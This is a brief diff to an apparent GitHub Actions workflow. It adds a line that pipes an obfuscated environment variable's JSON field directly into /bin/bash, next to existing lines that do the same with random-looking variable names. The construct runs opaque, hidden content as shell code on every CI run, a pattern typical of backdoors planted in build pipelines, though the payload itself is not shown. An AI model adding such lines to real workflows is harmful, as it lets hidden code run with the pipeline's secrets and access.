@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$l8" | jq -r .v75 | /bin/bash
           printf '%s' "$jpt21875" | jq -r .lyajp1 | /bin/bash
+          echo $noz689 | jq -r .nih8 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
